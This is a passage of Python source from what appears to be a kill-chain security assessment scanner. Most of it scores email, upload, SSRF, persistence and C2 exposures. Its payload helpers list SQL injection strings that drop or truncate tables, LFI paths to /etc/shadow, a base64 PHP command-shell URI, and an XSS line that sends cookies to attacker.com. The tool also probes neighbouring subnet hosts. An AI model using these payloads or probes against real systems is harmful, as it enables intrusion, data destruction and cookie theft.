                risk_score=3.0,
                technique="T1566 — Phishing",
                data={"mx_records": mx_records},
            ))

        spf_record = self._check_spf()
        if spf_record:
            is_strong = "all" in spf_record or "fail" in spf_record.lower()
            findings.append(_make_finding(
                title="SPF Record",
                description=f"SPF record: {spf_record[:200]}",
                risk_score=2.0 if is_strong else 6.0,
                technique="T1566 — Phishing",
                data={"spf": spf_record, "is_strong": is_strong},
            ))
        else:
            findings.append(_make_finding(
                title="No SPF Record",
                description="No SPF record found — domain is vulnerable to email spoofing",
                risk_score=7.0,
                technique="T1566 — Phishing",
            ))

        dmarc_record = self._check_dmarc()
        if dmarc_record:
            has_reject = "p=reject" in dmarc_record or "p=quarantine" in dmarc_record
            findings.append(_make_finding(
                title="DMARC Record",
                description=f"DMARC policy: {dmarc_record[:200]}",
                risk_score=2.0 if has_reject else 5.0,
                technique="T1566 — Phishing",
                data={"dmarc": dmarc_record, "rejects_unauthorized": has_reject},
            ))
        else:
            findings.append(_make_finding(
                title="No DMARC Record",
                description="No DMARC record — domain susceptible to spoofing-based phishing",
                risk_score=7.5,
                technique="T1566 — Phishing",
            ))

        # --- Upload Endpoint Analysis ---
        upload_endpoints = self._find_upload_endpoints()
        if upload_endpoints:
            findings.append(_make_finding(
                title="Upload Endpoints Discovered",
                description=f"Found {len(upload_endpoints)} potential upload endpoints",
                risk_score=7.0,
                technique="T1566.001 — Spearphishing Attachment",
                data={"endpoints": upload_endpoints},
            ))

        # --- File Upload Restrictions Check ---
        upload_restrictions = self._check_upload_restrictions()
        if upload_restrictions:
            findings.append(_make_finding(
                title="Upload Restriction Analysis",
                description=f"Analysed upload restrictions: {len(upload_restrictions)} indicators",
                risk_score=upload_restrictions.get("risk", 5.0),
                technique="T1566.001 — Spearphishing Attachment",
                data=upload_restrictions,
            ))

        # --- Phishing Vector Detection (forms) ---
        phishing_forms = self._detect_phishing_vectors()
        if phishing_forms:
            findings.append(_make_finding(
                title="Potential Phishing Vectors",
                description=f"Found {len(phishing_forms)} forms usable for phishing campaigns",
                risk_score=6.5,
                technique="T1566.002 — Spearphishing Link",
                data={"forms": phishing_forms[:10]},
            ))

        # --- SSRF-able Endpoint Detection ---
        ssrf_endpoints = self._detect_ssrf_endpoints()
        if ssrf_endpoints:
            findings.append(_make_finding(
                title="SSRF-Susceptible Endpoints",
                description=f"Found {len(ssrf_endpoints)} endpoints potentially vulnerable to SSRF",
                risk_score=8.5,
                technique="T1190 — Exploit Public-Facing Application",
                data={"endpoints": ssrf_endpoints},
            ))

        # --- Open Relay Check ---
        relay_check = self._check_open_relay()
        if relay_check:
            findings.append(_make_finding(
                title="Email Relay Assessment",
                description=relay_check.get("description", "Email relay check performed"),
                risk_score=relay_check.get("risk_score", 2.0),
                technique="T1566 — Phishing",
                data=relay_check,
            ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # =======================================================================
    # PHASE 4 — EXPLOITATION
    # =======================================================================

    def _phase_exploitation(self) -> KillChainPhase:
        """Phase 4: Exploitation feasibility scoring.

        Combines findings from phases 1–3 into an exploit feasibility
        matrix, identifies attack paths, ranks vulnerabilities by
        exploitability, and generates an initial attack tree.
        """
        phase = KillChainPhase(
            phase="exploitation",
            label=PHASE_LABELS["exploitation"],
            mitre_techniques=list(MITRE_EXPLOIT),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        # Gather all findings from previous phases
        all_prev_findings: List[Dict[str, Any]] = []
        for prev_phase_id in ["reconnaissance", "weaponization", "delivery"]:
            prev = self._phases.get(prev_phase_id)
            if prev:
                all_prev_findings.extend(prev.findings)

        # --- Vulnerability Ranking ---
        ranked_vulns = sorted(all_prev_findings, key=lambda f: f.get("risk_score", 0), reverse=True)
        top_vulns = ranked_vulns[:10]
        if top_vulns:
            findings.append(_make_finding(
                title="Top Vulnerability Rankings",
                description=f"Ranked {len(top_vulns)} vulnerabilities by exploitability",
                risk_score=top_vulns[0].get("risk_score", 0),
                technique="T1190 — Exploit Public-Facing Application",
                data={"ranked": [
                    {"title": v["title"], "score": v.get("risk_score", 0)} for v in top_vulns
                ]},
            ))

        # --- Exploit Feasibility Matrix ---
        feasibility = self._compute_exploit_feasibility(all_prev_findings)
        findings.append(_make_finding(
            title="Exploit Feasibility Matrix",
            description=(
                f"Network exposure: {feasibility['network_exposure']:.1f}/10, "
                f"Tech exploitability: {feasibility['tech_exploitability']:.1f}/10, "
                f"Delivery viability: {feasibility['delivery_viability']:.1f}/10"
            ),
            risk_score=feasibility["composite"],
            technique="T1210 — Exploitation of Remote Services",
            data=feasibility,
        ))

        # --- Attack Path Identification ---
        attack_paths = self._identify_attack_paths(all_prev_findings)
        for path in attack_paths:
            findings.append(_make_finding(
                title=path.description,
                description=(
                    f"Path: {' → '.join(path.phases)} | "
                    f"Feasibility: {path.feasibility_score:.1f}/10 | "
                    f"Impact: {path.impact}"
                ),
                risk_score=path.feasibility_score,
                technique=", ".join(path.techniques[:2]) if path.techniques else "T1190",
                data=path.to_dict(),
            ))

        # --- Remote Service Exploitation Check ---
        open_ports_indicators = self._detect_remote_service_indicators()
        if open_ports_indicators:
            findings.append(_make_finding(
                title="Remote Service Indicators",
                description=f"Found {len(open_ports_indicators)} remote service indicators",
                risk_score=7.0,
                technique="T1210 — Exploitation of Remote Services",
                data={"indicators": open_ports_indicators},
            ))

        # --- Public-Facing Application Exploit Check ---
        pf_apps = self._detect_public_facing_apps()
        if pf_apps:
            findings.append(_make_finding(
                title="Public-Facing Application Endpoints",
                description=f"Discovered {len(pf_apps)} public-facing application endpoints",
                risk_score=7.5,
                technique="T1190 — Exploit Public-Facing Application",
                data={"applications": pf_apps},
            ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # =======================================================================
    # PHASE 5 — INSTALLATION
    # =======================================================================

    def _phase_installation(self) -> KillChainPhase:
        """Phase 5: Persistence mechanism detection.

        Checks for writeable paths, backup file discovery, configuration
        file exposure, cron job detection, startup script exposure,
        and database dump accessibility.
        """
        phase = KillChainPhase(
            phase="installation",
            label=PHASE_LABELS["installation"],
            mitre_techniques=list(MITRE_INSTALL),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        # --- Sensitive Path Probing ---
        exposed_paths = self._probe_sensitive_paths()
        if exposed_paths:
            findings.append(_make_finding(
                title="Exposed Sensitive Paths",
                description=f"Found {len(exposed_paths)} accessible sensitive paths/files",
                risk_score=8.5,
                technique="T1543 — Create/Modify System Process",
                data={"paths": exposed_paths[:20]},
            ))

        # --- Backup File Discovery ---
        backups = self._discover_backup_files()
        if backups:
            findings.append(_make_finding(
                title="Backup Files Discovered",
                description=f"Found {len(backups)} accessible backup files",
                risk_score=9.0,
                technique="T1560 — Archive Collected Data",
                data={"backups": backups[:20]},
            ))

        # --- Configuration File Exposure ---
        config_files = self._discover_config_files()
        if config_files:
            findings.append(_make_finding(
                title="Configuration Files Exposed",
                description=f"Found {len(config_files)} exposed configuration files",
                risk_score=8.0,
                technique="T1543 — Create/Modify System Process",
                data={"configs": config_files[:20]},
            ))

        # --- Writeable Path Detection ---
        writeable = self._detect_writeable_indicators()
        if writeable:
            findings.append(_make_finding(
                title="Writeable Path Indicators",
                description=f"Found {len(writeable)} indicators of writeable paths",
                risk_score=7.5,
                technique="T1053 — Scheduled Task/Job",
                data={"indicators": writeable},
            ))

        # --- Cron/Job Detection ---
        cron_indicators = self._detect_cron_indicators()
        if cron_indicators:
            findings.append(_make_finding(
                title="Cron/Scheduled Job Indicators",
                description=f"Found {len(cron_indicators)} cron/scheduled job indicators",
                risk_score=7.0,
                technique="T1053 — Scheduled Task/Job",
                data={"indicators": cron_indicators},
            ))

        # --- Startup Script Exposure ---
        startup_scripts = self._detect_startup_exposure()
        if startup_scripts:
            findings.append(_make_finding(
                title="Startup Script Exposure",
                description=f"Found {len(startup_scripts)} startup script exposure indicators",
                risk_score=7.5,
                technique="T1547 — Boot or Logon Autostart",
                data={"scripts": startup_scripts},
            ))

        # --- Database Dump Accessibility ---
        db_dumps = self._detect_database_dumps()
        if db_dumps:
            findings.append(_make_finding(
                title="Database Dump Accessibility",
                description=f"Found {len(db_dumps)} potential database dump indicators",
                risk_score=9.5,
                technique="T1070 — Indicator Removal",
                data={"dumps": db_dumps},
            ))

        # --- Persistence Opportunities ---
        persistence = self._assess_persistence_opportunities()
        if persistence:
            findings.append(_make_finding(
                title="Persistence Opportunities",
                description=f"Identified {len(persistence)} persistence mechanism opportunities",
                risk_score=persistence.get("risk_score", 5.0),
                technique="T1574 — Hijack Execution Flow",
                data=persistence,
            ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # =======================================================================
    # PHASE 6 — COMMAND & CONTROL
    # =======================================================================

    def _phase_command_and_control(self) -> KillChainPhase:
        """Phase 6: C2 infrastructure analysis.

        Checks for common C2 URI patterns, botnet signatures, DNS C2-style
        patterns, reverse shell indicators, and WebSocket availability
        for bidirectional control channels.
        """
        phase = KillChainPhase(
            phase="command_and_control",
            label=PHASE_LABELS["command_and_control"],
            mitre_techniques=list(MITRE_C2),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        # --- C2 URI Pattern Detection ---
        c2_paths = self._detect_c2_paths()
        if c2_paths:
            findings.append(_make_finding(
                title="C2 URI Patterns Detected",
                description=f"Found {len(c2_paths)} endpoints matching C2 naming patterns",
                risk_score=8.0,
                technique="T1071 — Application Layer Protocol",
                data={"paths": c2_paths},
            ))

        # --- Botnet Signature Detection ---
        botnet_sigs = self._detect_botnet_signatures()
        if botnet_sigs:
            findings.append(_make_finding(
                title="Botnet Signature Indicators",
                description=f"Found {len(botnet_sigs)} potential botnet-related patterns",
                risk_score=8.5,
                technique="T1090 — Proxy",
                data={"signatures": botnet_sigs},
            ))

        # --- DNS C2-Style Pattern Analysis ---
        dns_c2 = self._analyze_dns_c2_patterns()
        if dns_c2:
            findings.append(_make_finding(
                title="DNS C2-Style Patterns",
                description=f"DNS analysis revealed {len(dns_c2)} C2-style indicators",
                risk_score=7.5,
                technique="T1572 — Protocol Tunneling",
                data={"patterns": dns_c2},
            ))

        # --- Reverse Shell Indicators ---
        reverse_shell = self._detect_reverse_shell_indicators()
        if reverse_shell:
            findings.append(_make_finding(
                title="Reverse Shell Indicators",
                description=f"Found {len(reverse_shell)} indicators of reverse shell capability",
                risk_score=9.0,
                technique="T1571 — Non-Standard Port",
                data={"indicators": reverse_shell},
            ))

        # --- WebSocket Availability ---
        ws_endpoints = self._detect_websocket_endpoints()
        if ws_endpoints:
            findings.append(_make_finding(
                title="WebSocket Endpoints",
                description=f"Found {len(ws_endpoints)} WebSocket endpoints for bidirectional control",
                risk_score=6.0,
                technique="T1095 — Non-Application Layer Protocol",
                data={"endpoints": ws_endpoints},
            ))

        # --- Encrypted Channel Potential ---
        encrypted = self._analyze_encrypted_channel_potential()
        if encrypted:
            findings.append(_make_finding(
                title="Encrypted Channel Potential",
                description=encrypted.get("description", "Encrypted channel analysis performed"),
                risk_score=encrypted.get("risk_score", 3.0),
                technique="T1573 — Encrypted Channel",
                data=encrypted,
            ))

        # --- Proxy/Ingress Indicators ---
        proxy_indicators = self._detect_proxy_indicators()
        if proxy_indicators:
            findings.append(_make_finding(
                title="Proxy/Ingress Transfer Indicators",
                description=f"Found {len(proxy_indicators)} proxy/ingress transfer indicators",
                risk_score=6.5,
                technique="T1105 — Ingress Tool Transfer",
                data={"indicators": proxy_indicators},
            ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # =======================================================================
    # PHASE 7 — ACTIONS ON OBJECTIVES
    # =======================================================================

    def _phase_actions_on_objectives(self) -> KillChainPhase:
        """Phase 7: Impact assessment.

        Performs data exfiltration risk scoring, lateral movement potential
        analysis, privilege escalation path identification, business impact
        calculation, and data classification inference.
        """
        phase = KillChainPhase(
            phase="actions_on_objectives",
            label=PHASE_LABELS["actions_on_objectives"],
            mitre_techniques=list(MITRE_ACTION),
            timestamp=time.time(),
        )
        t0 = time.time()
        findings: List[Dict[str, Any]] = []

        # --- Data Exfiltration Risk Scoring ---
        exfil_risk = self._score_exfiltration_risk()
        findings.append(_make_finding(
            title="Data Exfiltration Risk",
            description=(
                f"Exfiltration risk score: {exfil_risk['overall']:.1f}/10. "
                f"Network vectors: {exfil_risk['network_vectors']}, "
                f"Application vectors: {exfil_risk['app_vectors']}"
            ),
            risk_score=exfil_risk["overall"],
            technique="T1041 — Exfiltration Over C2 Channel",
            data=exfil_risk,
        ))

        # --- Lateral Movement Potential ---
        lateral = self._assess_lateral_movement()
        findings.append(_make_finding(
            title="Lateral Movement Potential",
            description=(
                f"Lateral movement score: {lateral['score']:.1f}/10. "
                f"Internal paths: {lateral['internal_paths']}, "
                f"Service connections: {lateral['service_connections']}"
            ),
            risk_score=lateral["score"],
            technique="T1021 — Remote Services",
            data=lateral,
        ))

        # --- Privilege Escalation Paths ---
        privesc = self._identify_privesc_paths()
        if privesc:
            findings.append(_make_finding(
                title="Privilege Escalation Paths",
                description=f"Identified {len(privesc)} potential privilege escalation vectors",
                risk_score=privesc[0].get("risk_score", 5.0) if privesc else 3.0,
                technique="T1078 — Valid Accounts",
                data={"paths": privesc[:10]},
            ))

        # --- Business Impact Calculation ---
        business_impact = self._calculate_business_impact()
        findings.append(_make_finding(
            title="Business Impact Assessment",
            description=(
                f"Financial impact: {business_impact['financial']}, "
                f"Reputational: {business_impact['reputational']}, "
                f"Operational: {business_impact['operational']}, "
                f"Compliance: {business_impact['compliance']}"
            ),
            risk_score=business_impact["overall_score"],
            technique="T1486 — Data Encrypted for Impact",
            data=business_impact,
        ))

        # --- Data Classification Inference ---
        data_class = self._infer_data_classification()
        findings.append(_make_finding(
            title="Data Classification Inference",
            description=(
                f"Sensitivity level: {data_class['sensitivity_level']}. "
                f"Data types detected: {', '.join(data_class['data_types'])}"
            ),
            risk_score=data_class["risk_score"],
            technique="T1560 — Archive Collected Data",
            data=data_class,
        ))

        # --- DoS Impact Assessment ---
        dos_assessment = self._assess_dos_impact()
        findings.append(_make_finding(
            title="Denial of Service Impact",
            description=(
                f"DoS impact: {dos_assessment['impact_level']}. "
                f"Vectors: {', '.join(dos_assessment['vectors'])}"
            ),
            risk_score=dos_assessment["risk_score"],
            technique="T1498 — Network Denial of Service",
            data=dos_assessment,
        ))

        # --- Alternate Exfiltration Protocol Analysis ---
        alt_exfil = self._analyze_alternate_exfiltration()
        if alt_exfil:
            findings.append(_make_finding(
                title="Alternate Exfiltration Protocols",
                description=f"Identified {len(alt_exfil)} alternate exfiltration protocol opportunities",
                risk_score=7.0,
                technique="T1048 — Exfiltration Over Alternate Protocol",
                data={"protocols": alt_exfil},
            ))

        phase.findings = findings
        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
        phase.risk_level = _classify_score(phase.risk_score)
        phase.duration_sec = round(time.time() - t0, 3)
        return phase

    # -----------------------------------------------------------------------
    # Helper methods — Reconnaissance
    # -----------------------------------------------------------------------

    def _enumerate_subnet(self, ip: str) -> List[Dict[str, Any]]:
        """Probe adjacent IPs in the same /24 subnet."""
        findings: List[Dict[str, Any]] = []
        try:
            parts = ip.split(".")
            base = ".".join(parts[:3])
            target_octet = int(parts[3])
            probe_offsets = [-2, -1, 1, 2]
            for offset in probe_offsets:
                probe_ip = f"{base}.{target_octet + offset}"
                if not (0 <= (target_octet + offset) <= 255):
                    continue
                try:
                    socket.setdefaulttimeout(float(self.timeout))
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex((probe_ip, 80))
                    sock.close()
                    if result == 0:
                        rdns = _reverse_dns(probe_ip)
                        findings.append(_make_finding(
                            title="Active Host in Subnet",
                            description=f"Host {probe_ip}:80 is active" + (f" (rdns: {rdns})" if rdns else ""),
                            risk_score=3.5,
                            technique="T1595 — Active Scanning",
                            data={"ip": probe_ip, "port": 80, "rdns": rdns},
                        ))
                except (socket.error, OSError):
                    pass
        except (ValueError, IndexError):
            pass
        return findings

    def _harvest_dns_records(self) -> List[Dict[str, str]]:
        """Harvest DNS records via the system 'dig' command."""
        records: List[Dict[str, str]] = []
        record_types = ["A", "AAAA", "MX", "TXT", "NS", "SOA", "CNAME", "SRV"]
        for rtype in record_types:
            output = _run_subprocess(["dig", "+short", self._domain, rtype], timeout=self.timeout)
            for line in output.strip().splitlines():
                line = line.strip()
                if line and not line.startswith(";") and not line.startswith(";;"):
                    records.append({"type": rtype, "value": line, "domain": self._domain})
        return records

    def _whois_lookup(self) -> Dict[str, str]:
        """Perform a WHOIS lookup via subprocess."""
        output = _run_subprocess(["whois", self._domain], timeout=self.timeout)
        if not output:
            return {}
        data: Dict[str, str] = {}
        patterns = [
            (r"Registrar:\s*(.+)", "registrar"),
            (r"Creation Date:\s*(.+)", "creation_date"),
            (r"Expiry Date:\s*(.+)", "expiry_date"),
            (r"Name Server:\s*(.+)", "name_server"),
            (r"Registrant Organization:\s*(.+)", "org"),
            (r"Registrant Email:\s*(.+)", "email"),
            (r"Updated Date:\s*(.+)", "updated_date"),
            (r"Domain Status:\s*(.+)", "status"),
        ]
        for pattern, key in patterns:
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                data[key] = match.group(1).strip()
        return data

    def _extract_subdomains_from_page(self) -> List[str]:
        """Extract subdomains and related domains from page content."""
        subdomains: set = set()
        domain_suffix = "." + self._domain
        # Extract from links
        link_pattern = re.compile(r"https?://([a-z0-9.-]+" + re.escape(self._domain) + r")[^\s\"'<>]*", re.IGNORECASE)
        for match in link_pattern.finditer(self._body_text):
            full = match.group(1).lower()
            if full != self._domain:
                subdomains.add(full.split("/")[0])
        # Extract from JS content references
        js_pattern = re.compile(r"([a-z0-9-]+\." + re.escape(self._domain.replace(".", r"\.")) + r")", re.IGNORECASE)
        for match in js_pattern.finditer(self._body_text):
            sub = match.group(1).lower()
            if sub.startswith("www."):
                sub = sub[4:]
            if sub != self._domain:
                subdomains.add(sub)
        # Extract from wildcard cert patterns in headers
        for hdr_val in self._headers.values():
            for pat in SUBDOMAIN_PATTERNS:
                for m in pat.finditer(hdr_val):
                    subdomains.add(m.group(0))
        return sorted(d for d in subdomains if d != self._domain)

    def _asn_lookup(self) -> Dict[str, str]:
        """Attempt ASN lookup via dig TXT or subprocess."""
        result: Dict[str, str] = {}
        # Try dig for ASN origin
        if self._ips:
            ip = self._ips[0]
            output = _run_subprocess(
                ["dig", "+short", "-x", ip],
                timeout=self.timeout,
            )
            if output.strip():
                result["reverse"] = output.strip().splitlines()[0]
            # Try BGP/ASN query
            output2 = _run_subprocess(
                ["dig", "+short", "AS{}.asn.cymru.com".format("0".join(ip.split("."))) + ".txt", "TXT"],
                timeout=self.timeout,
            )
            for line in output2.strip().splitlines():
                parts = line.strip().strip('"').split(" | ")
                if len(parts) >= 5:
                    result["asn"] = parts[0]
                    result["org"] = parts[4]
        return result

    def _detect_technologies(self) -> List[str]:
        """Detect technology stack from HTTP headers and page content."""
        detected: List[str] = []
        headers_str = "\n".join(f"{k}: {v}" for k, v in self._headers.items())

        for tech_name, tech_info in TECH_SIGNATURES.items():
            for sig in tech_info.get("headers", []):
                if sig.lower() in headers_str.lower():
                    if tech_name not in detected:
                        detected.append(tech_name)
                    break
            for pattern in tech_info.get("cve_patterns", []):
                if re.search(pattern, headers_str + "\n" + self._body_text, re.IGNORECASE):
                    if tech_name not in detected:
                        detected.append(tech_name)
                    break

        # Additional heuristics
        if re.search(r"jquery|react|angular|vue\.js", self._body_text, re.IGNORECASE):
            if "javascript_frameworks" not in detected:
                detected.append("javascript_frameworks")
        if re.search(r"cloudflare|cf-ray|x-cf-", headers_str, re.IGNORECASE):
            detected.append("cloudflare")
        if re.search(r"x-amz|s3|cloudfront", headers_str, re.IGNORECASE):
            detected.append("aws")
        if re.search(r"google-cloud|gcp|firebase", headers_str + self._body_text, re.IGNORECASE):
            detected.append("gcp")

        return detected

    # -----------------------------------------------------------------------
    # Helper methods — Weaponization
    # -----------------------------------------------------------------------

    def _generate_sqli_payloads(self) -> List[str]:
        """Generate SQL injection payloads tailored to the target."""
        payloads: List[str] = []
        detected = self._detect_technologies()

        # Generic payloads
        generic = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' ORDER BY 1--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        ]
        payloads.extend(generic)

        # Tech-specific
        if "wordpress" in detected or "php" in detected:
            payloads.extend([
                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "1' UNION SELECT user(),password FROM wp_users--",
            ])
        if "aspnet" in detected or "iis" in detected:
            payloads.extend([
                "1'; EXEC sp_msforeachtable 'TRUNCATE TABLE ?'--",
                "1' UNION SELECT name,null,null FROM sysobjects WHERE xtype='U'--",
            ])

        return payloads

    def _generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads for the target context."""
        payloads: List[str] = [
            "<script>alert('XSS')</script>",
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            "<svg onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<img src=# onerror=\"alert('XSS')\">",
            "<div style=\"background:url('javascript:alert(1)')\">",
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ]

        # Check if the page contains forms — add form-context payloads
        if re.search(r"<form|<input", self._body_text, re.IGNORECASE):
            payloads.extend([
                '"><input type="text" onfocus="alert(1)" autofocus>',
                '" autofocus onfocus="alert(1)',
            ])

        return payloads

    def _generate_lfi_payloads(self) -> List[str]:
        """Generate Local File Inclusion payloads."""
        payloads: List[str] = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "/etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/proc/self/environ",
            "/proc/self/fd/0",
            "/var/log/apache2/access.log",
            "/var/log/auth.log",
            "php://filter/convert.base64-encode/resource=index",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ]
        return payloads

    # -----------------------------------------------------------------------
    # Helper methods — Delivery
    # -----------------------------------------------------------------------

    def _check_mx_records(self) -> List[str]:
        """Check MX records via dig."""
        output = _run_subprocess(["dig", "+short", "MX", self._domain], timeout=self.timeout)
        return [line.strip() for line in output.strip().splitlines() if line.strip() and not line.startswith(";")]

    def _check_spf(self) -> str:
        """Check SPF record via dig TXT."""
        output = _run_subprocess(["dig", "+short", "TXT", self._domain], timeout=self.timeout)
        for line in output.strip().splitlines():
            if "v=spf1" in line.lower():
                return line.strip().strip('"')
        return ""

    def _check_dmarc(self) -> str:
        """Check DMARC record via dig TXT on _dmarc subdomain."""
        output = _run_subprocess(
            ["dig", "+short", "TXT", f"_dmarc.{self._domain}"],
            timeout=self.timeout,
        )
        for line in output.strip().splitlines():
            if "v=dmarc1" in line.lower():
                return line.strip().strip('"')
        return ""

    def _find_upload_endpoints(self) -> List[Dict[str, str]]:
        """Find potential file upload endpoints in page content."""
        endpoints: List[Dict[str, str]] = []
        # Form-based uploads
        upload_form_pattern = re.compile(
            r'<form[^>]*[^>]*action=["\']([^"\']*)["\'][^>]*>.*?'
            r'<input[^>]*type=["\']file["\'][^>]*>',
            re.DOTALL | re.IGNORECASE,
        )
        for m in upload_form_pattern.finditer(self._body_text):
            action = m.group(1)
            if not action.startswith(("http://", "https://")):
                action = self._base_url + action
            endpoints.append({"action": action, "method": "POST", "type": "form"})

        # API-style endpoints in JS
        api_pattern = re.compile(r'["\'](?:upload|file|attachment|media)["\'].*?["\']([^"\']*(?:/upload|/file|/media|/attach)[^"\']*)["\']', re.IGNORECASE)
        for m in api_pattern.finditer(self._body_text):
            endpoints.append({"action": m.group(1), "method": "POST", "type": "api"})

        return endpoints

    def _check_upload_restrictions(self) -> Dict[str, Any]:
        """Analyse upload restrictions from headers and page content."""
        result: Dict[str, Any] = {"risk": 3.0, "indicators": []}

        # Check Content-Type restrictions in headers
        accept_header = self._headers.get("accept", "")
        if "*" in accept_header or not accept_header:
            result["indicators"].append("No Content-Type restriction in Accept header")

        # Check for client-side validation patterns
        allowed_ext_pattern = re.compile(
            r"accept=[\"']([^\"]+)[\"']",
            re.IGNORECASE,
        )
        for m in allowed_ext_pattern.finditer(self._body_text):
            result["indicators"].append(f"Allowed extensions: {m.group(1)}")

        # Check for size restrictions
        size_pattern = re.compile(
            r"(?:max_file_size|maxSize|MAX_FILE_SIZE|maxFileSize)[^\d]*(\d+)",
            re.IGNORECASE,
        )
        for m in size_pattern.finditer(self._body_text):
            result["indicators"].append(f"Upload size limit: {m.group(1)} bytes")

        # Check CORS headers
        cors = self._headers.get("access-control-allow-origin", "")
        if cors == "*":
            result["indicators"].append("Permissive CORS (wildcard origin)")
            result["risk"] = max(result["risk"], 5.0)

        if len(result["indicators"]) > 3:
            result["risk"] = min(result["risk"] + 2.0, 10.0)

        return result

    def _detect_phishing_vectors(self) -> List[Dict[str, str]]:
        """Detect forms usable for phishing (login, signup, newsletter, contact)."""
        vectors: List[Dict[str, str]] = []
        form_types = [
            ("login", r"(?:login|sign[-_]?in|log[-_]?in)", r"password"),
            ("signup", r"(?:sign[-_]?up|register|join|create[-_]?account)", None),
            ("newsletter", r"(?:newsletter|subscribe|mailing[-_]?list)", r"email"),
            ("contact", r"(?:contact|feedback|support|help)", None),
            ("search", r"(?:search|query|find)", r"(?:q|query|search|keyword)"),
        ]
        form_pattern = re.compile(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            re.DOTALL | re.IGNORECASE,
        )
        for form_match in form_pattern.finditer(self._body_text):
            action = form_match.group(1)
            body = form_match.group(2)
            for ftype, action_re, field_re in form_types:
                if re.search(action_re, action + " " + body, re.IGNORECASE):
                    fields = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', body, re.IGNORECASE)
                    if field_re:
                        has_field = any(re.search(field_re, f, re.IGNORECASE) for f in fields)
                        if not has_field:
                            continue
                    vectors.append({"type": ftype, "action": action, "fields": fields[:5]})

        return vectors

    def _detect_ssrf_endpoints(self) -> List[Dict[str, str]]:
        """Detect endpoints potentially vulnerable to SSRF."""
        endpoints: List[Dict[str, str]] = []
        ssrf_indicators = [
            r"url=(?:http|https|ftp)://",
            r"redirect=(?:http|https)://",
            r"return(?:Url|_url|to)=(?:http|https)://",
            r"next=(?:http|https)://",
            r"callback=(?:http|https)://",
            r"reference=(?:http|https)://",
            r"dest=(?:http|https)://",
            r"fetch(?:Url|_url|URL)=",
            r"link=(?:http|https)://",
            r"goto=(?:http|https)://",
            r"out=(?:http|https)://",
            r"img=(?:http|https)://",
            r"src=(?:http|https)://",
            r"proxy=(?:http|https)://",
        ]
        for pattern in ssrf_indicators:
            for match in re.finditer(pattern, self._body_text, re.IGNORECASE):
                param_name = match.group(0).split("=")[0]
                endpoints.append({"parameter": param_name, "pattern": match.group(0)[:100]})

        # Also check for fetch/XMLHttpRequest patterns that take URLs
        fetch_pattern = re.compile(
            r'(?:fetch|XMLHttpRequest|\.ajax|axios)\s*\(\s*["\'](?:https?://[^"\']+)["\']',
            re.IGNORECASE,
        )
        for match in fetch_pattern.finditer(self._body_text):
            endpoints.append({"parameter": "fetch_url", "pattern": match.group(0)[:100]})

        return endpoints

    def _check_open_relay(self) -> Dict[str, Any]:
        """Assess open relay potential via MX analysis."""
        result: Dict[str, Any] = {"description": "", "risk_score": 2.0}
        mx_records = self._check_mx_records()
        if not mx_records:
            result["description"] = "No MX records found"
            return result

        # Check for common open-relay indicators
        common_providers = ["google", "gmail", "outlook", "microsoft", "yahoo", "amazon", "protection", "mimecast", "proofpoint"]
        for mx in mx_records:
            mx_lower = mx.lower()
            is_managed = any(p in mx_lower for p in common_providers)
            if not is_managed:
                result["risk_score"] = 5.0
                result["description"] = f"Potential self-hosted mail: {mx}"
                result["self_hosted"] = True
            else:
                result["description"] = f"Mail handled by: {mx}"

        return result

    # -----------------------------------------------------------------------
    # Helper methods — Exploitation
    # -----------------------------------------------------------------------

    def _compute_exploit_feasibility(self, findings: List[Dict[str, Any]]) -> Dict[str, float]:
        """Compute exploit feasibility matrix from aggregated findings."""
        network_exposure = 0.0
        tech_exploitability = 0.0
        delivery_viability = 0.0

        for f in findings:
            rs = f.get("risk_score", 0)
            title_lower = f["title"].lower()
            if any(kw in title_lower for kw in ["dns", "subnet", "port", "host", "ip", "service"]):
                network_exposure = max(network_exposure, rs)
            elif any(kw in title_lower for kw in ["exploit", "payload", "vulnerability", "xss", "sqli", "lfi", "tech"]):
